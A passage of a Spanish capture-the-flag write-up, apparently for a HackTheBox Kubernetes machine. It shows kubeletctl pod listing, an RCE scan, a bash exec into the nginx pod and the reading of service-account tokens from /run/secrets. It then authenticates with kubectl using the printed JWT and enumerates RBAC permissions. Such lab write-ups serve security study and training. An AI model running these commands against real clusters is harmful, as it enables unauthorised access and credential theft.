SF:r&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;Content-Length:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20212&lt;span class=&quot;se&quot;&gt;\r\n\r\n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;kind&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;:&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;Status&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;,&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;apiVersion&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;:&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;
SF:v1&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;,&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;metadata&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt;,&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;status&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;:&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;Failure&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;,&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;message&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;:&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;forbidden:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2
SF:0User&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\\\&quot;&lt;/span&gt;system:anonymous&lt;span class=&quot;se&quot;&gt;\\\&quot;\x&lt;/span&gt;20cannot&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20get&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20path&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\\\&quot;&lt;/span&gt;/nice
SF:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20ports,/Trinity&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;txt&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;bak&lt;span class=&quot;se&quot;&gt;\\\&quot;\&quot;&lt;/span&gt;,&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;reason&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;:&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;Forbidden&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;,&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;details&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;
SF::&lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt;,&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;code&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;:403&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;);
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Feb 15 19:23:39 2022 -- 1 IP address (1 host up) scanned in 108.88 seconds
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Vemos por los puertos abiertos que estamos ante Kubernetes
Procedemos a usar dos herramientas para ello&lt;/p&gt;

&lt;h1 id=&quot;kubectl--kubeletctl&quot;&gt;Kubectl &amp;amp; Kubeletctl&lt;/h1&gt;

&lt;p&gt;Procedemos a listar los “Pods” existentes con Kubeletctl&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# kubeletctl -s 10.10.11.133 pods                                                                                        1 ⚙&lt;/span&gt;
┌────────────────────────────────────────────────────────────────────────────────┐
│                                Pods from Kubelet                               │
├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 1 │ kube-proxy-zd55k                   │ kube-system │ kube-proxy              │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 2 │ coredns-78fcd69978-gl6gt           │ kube-system │ coredns                 │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 3 │ nginx                              │ default     │ nginx                   │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 4 │ etcd-steamcloud                    │ kube-system │ etcd                    │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 5 │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 6 │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 7 │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 8 │ storage-provisioner                │ kube-system │ storage-provisioner     │
│   │                                    │             │                         │
└───┴────────────────────────────────────┴─────────────┴─────────────────────────┘
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Para listar si tenemos ejecucion remota de comandos en algun pod/ container &lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# kubeletctl -s 10.10.11.133 scan rce                             130 ⨯ 1 ⚙&lt;/span&gt;
┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                   Node with pods vulnerable to RCE                                  │
├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
│   │ NODE IP      │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│   │              │                                    │             │                         │ RUN │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 1 │ 10.10.11.133 │ storage-provisioner                │ kube-system │ storage-provisioner     │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 2 │              │ kube-proxy-zd55k                   │ kube-system │ kube-proxy              │ +   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 3 │              │ coredns-78fcd69978-gl6gt           │ kube-system │ coredns                 │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 4 │              │ nginx                              │ default     │ nginx                   │ +   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 5 │              │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 6 │              │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 7 │              │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 8 │              │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │ -   │
└───┴──────────────┴────────────────────────────────────┴─────────────┴─────────────────────────┴─────┘
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Accediendo al contenedor&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# rlwrap kubeletctl -s 10.10.11.133 -p nginx -c nginx exec bash &lt;/span&gt;
root@nginx:/# &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/user.txt
3x7bxxxx245fc708b1xxxxxxxxxxxxxx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios&lt;/h1&gt;
&lt;p&gt;KUBERNETES TOKENS → cuando tenemos RCE en algun Pod 
https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/kubernetes-enumeration&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# kubeletctl -s 10.10.11.133 -p nginx -c nginx exec &quot;ls -l /run/secrets/kubernetes.io/serviceaccount&quot;                             &lt;/span&gt;
total 0
lrwxrwxrwx 1 root root 13 Apr  4 12:31 ca.crt -&amp;gt; ..data/ca.crt
lrwxrwxrwx 1 root root 16 Apr  4 12:31 namespace -&amp;gt; ..data/namespace
lrwxrwxrwx 1 root root 12 Apr  4 12:31 token -&amp;gt; ..data/token

&lt;span class=&quot;c&quot;&gt;# kubeletctl -s 10.10.11.133 -p nginx -c nginx exec &quot;cat /run/secrets/kubernetes.io/serviceaccount/ca.crt&quot; &amp;gt; content/ca.crt&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# kubeletctl -s 10.10.11.133 -p nginx -c nginx exec &quot;cat /run/secrets/kubernetes.io/serviceaccount/namespace&quot; &amp;gt; content/namespace&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# kubeletctl -s 10.10.11.133 -p nginx -c nginx exec &quot;cat /run/secrets/kubernetes.io/serviceaccount/token&quot; &amp;gt; content/token&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos a intentar authenticarnos con estos tres recursos de la siguiente forma usando Kubectl&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Conectandonos con Kubectl siguiendo los pasos proporcionando ca.crt y token&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# kubectl -s https://10.10.11.133:8443 --certificate-authority=content/ca.crt --token=&apos;eyJhbGciOiJSUzI1NiIsImtpZCI6IlJ5N3BJcURINldzSUt1SFFiU0xjRUtDbi1GQXY0R1lwRlRyX3ByRFZ3RGcifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjgwNjExNDYyLCJpYXQiOjE2NDkwNzU0NjIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImVmMWNlMzYzLTU0YzktNDQwNC1hODcwLTMzMWRmMDk2NmI0ZiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjMwNzc2NjdmLTVmZGUtNDhlYi1iMmM1LWQ5NmVhM2UyODgxNSJ9LCJ3YXJuYWZ0ZXIiOjE2NDkwNzkwNjl9LCJuYmYiOjE2NDkwNzU0NjIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.TZCj8E75Ludl2FQOP_VOy1lPxHG4JZfcfKv71CgK0faFXHMwN2rve1pqXbAT3LfYtEWC9ZiVJc36ZwXdZ-yO5NjgDkapKQKvfhilTbaR3BnkzL2rArZVuiEbdBn2QIzUJGtuAOmz3jWk_fS64JkHWQiAIO_vMoZsBZeXZtszgz8h_cR3Un7__H4HDJRf5djlgbQx83dN5xCVyLHdv0oXNLkpakhbT49KkD6nd7_h-G258itL6Qweg-ketm-UpjuKMTQ_fYdozuVf0Qvub7so5gDb3puajgKN9LMxIPzPt4YdcYXMzAfkmQtztn7y9K-_teOyOPRZyizXLB-o2X2WYw&apos; get pods&lt;/span&gt;
NAME    READY   STATUS    RESTARTS   AGE
nginx   1/1     Running   0          28m
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Vemos que funciona y aqui procedemos a intentar insertar el parametro “auth”&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# kubectl -s https://10.10.11.133:8443 --certificate-authority=content/ca.crt --token=&apos;eyJhbGciOiJSUzI1NiIsImtpZCI6IlJ5N3BJcURINldzSUt1SFFiU0xjRUtDbi1GQXY0R1lwRlRyX3ByRFZ3RGcifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjgwNjExNDYyLCJpYXQiOjE2NDkwNzU0NjIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImVmMWNlMzYzLTU0YzktNDQwNC1hODcwLTMzMWRmMDk2NmI0ZiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjMwNzc2NjdmLTVmZGUtNDhlYi1iMmM1LWQ5NmVhM2UyODgxNSJ9LCJ3YXJuYWZ0ZXIiOjE2NDkwNzkwNjl9LCJuYmYiOjE2NDkwNzU0NjIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.TZCj8E75Ludl2FQOP_VOy1lPxHG4JZfcfKv71CgK0faFXHMwN2rve1pqXbAT3LfYtEWC9ZiVJc36ZwXdZ-yO5NjgDkapKQKvfhilTbaR3BnkzL2rArZVuiEbdBn2QIzUJGtuAOmz3jWk_fS64JkHWQiAIO_vMoZsBZeXZtszgz8h_cR3Un7__H4HDJRf5djlgbQx83dN5xCVyLHdv0oXNLkpakhbT49KkD6nd7_h-G258itL6Qweg-ketm-UpjuKMTQ_fYdozuVf0Qvub7so5gDb3puajgKN9LMxIPzPt4YdcYXMzAfkmQtztn7y9K-_teOyOPRZyizXLB-o2X2WYw&apos; auth    &lt;/span&gt;
Inspect authorization

Available Commands:
  can-i       Check whether an action is allowed
  reconcile   Reconciles rules &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;RBAC role, role binding, cluster role, and cluster role binding objects
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# kubectl -s https://10.10.11.133:8443 --certificate-authority=content/ca.crt --token=&apos;eyJhbGciOiJSUzI1NiIsImtpZCI6IlJ5N3BJcURINldzSUt1SFFiU0xjRUtDbi1GQXY0R1lwRlRyX3ByRFZ3RGcifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjgwNjExNDYyLCJpYXQiOjE2NDkwNzU0NjIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImVmMWNlMzYzLTU0YzktNDQwNC1hODcwLTMzMWRmMDk2NmI0ZiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjMwNzc2NjdmLTVmZGUtNDhlYi1iMmM1LWQ5NmVhM2UyODgxNSJ9LCJ3YXJuYWZ0ZXIiOjE2NDkwNzkwNjl9LCJuYmYiOjE2NDkwNzU0NjIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.TZCj8E75Ludl2FQOP_VOy1lPxHG4JZfcfKv71CgK0faFXHMwN2rve1pqXbAT3LfYtEWC9ZiVJc36ZwXdZ-yO5NjgDkapKQKvfhilTbaR3BnkzL2rArZVuiEbdBn2QIzUJGtuAOmz3jWk_fS64JkHWQiAIO_vMoZsBZeXZtszgz8h_cR3Un7__H4HDJRf5djlgbQx83dN5xCVyLHdv0oXNLkpakhbT49KkD6nd7_h-G258itL6Qweg-ketm-UpjuKMTQ_fYdozuVf0Qvub7so5gDb3puajgKN9LMxIPzPt4YdcYXMzAfkmQtztn7y9K-_teOyOPRZyizXLB-o2X2WYw&apos; auth can-i --list --namespace=nginx&lt;/span&gt;
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;                                    &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;create]
selfsubjectrulesreviews.authorization.k8s.io    &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;                                    &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;create]
                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/.well-known/openid-configuration]   &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/api/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;                              &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/api]                                &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/apis/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;                             &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/apis]                               &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/healthz]                            &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/healthz]                            &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/livez]                              &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/livez]                              &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/openapi/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;                          &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/openapi]                            &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/openid/v1/jwks]                     &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/readyz]                             &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/readyz]                             &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/version/]                           &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/version/]                           &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/version]                            &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/version]                            &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# kubectl -s https://10.10.11.133:8443 --certificate-authority=content/ca.crt --token=&apos;eyJhbGciOiJSUzI1NiIsImtpZCI6IlJ5N3BJcURINldzSUt1SFFiU0xjRUtDbi1GQXY0R1lwRlRyX3ByRFZ3RGcifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjgwNjExNDYyLCJpYXQiOjE2NDkwNzU0NjIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImVmMWNlMzYzLTU0YzktNDQwNC1hODcwLTMzMWRmMDk2NmI0ZiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjMwNzc2NjdmLTVmZGUtNDhlYi1iMmM1LWQ5NmVhM2UyODgxNSJ9LCJ3YXJuYWZ0ZXIiOjE2NDkwNzkwNjl9LCJuYmYiOjE2NDkwNzU0NjIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.TZCj8E75Ludl2FQOP_VOy1lPxHG4JZfcfKv71CgK0faFXHMwN2rve1pqXbAT3LfYtEWC9ZiVJc36ZwXdZ-yO5NjgDkapKQKvfhilTbaR3BnkzL2rArZVuiEbdBn2QIzUJGtuAOmz3jWk_fS64JkHWQiAIO_vMoZsBZeXZtszgz8h_cR3Un7__H4HDJRf5djlgbQx83dN5xCVyLHdv0oXNLkpakhbT49KkD6nd7_h-G258itL6Qweg-ketm-UpjuKMTQ_fYdozuVf0Qvub7so5gDb3puajgKN9LMxIPzPt4YdcYXMzAfkmQtztn7y9K-_teOyOPRZyizXLB-o2X2WYw&apos; auth can-i --list                  &lt;/span&gt;
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;                                    &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;create]
selfsubjectrulesreviews.authorization.k8s.io    &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;                                    &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;create]
pods                                            &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;                                    &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get &lt;span class=&quot;s2&quot;&gt;&quot;create&quot;&lt;/span&gt; list]
                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/.well-known/openid-configuration]   &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/api/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;                              &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/api]                                &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/apis/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;                             &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/apis]                               &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/healthz]                            &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/healthz]                            &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/livez]                              &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/livez]                              &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/openapi/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;                          &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/openapi]                            &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/openid/v1/jwks]                     &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/readyz]                             &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/readyz]                             &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/version/]                           &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
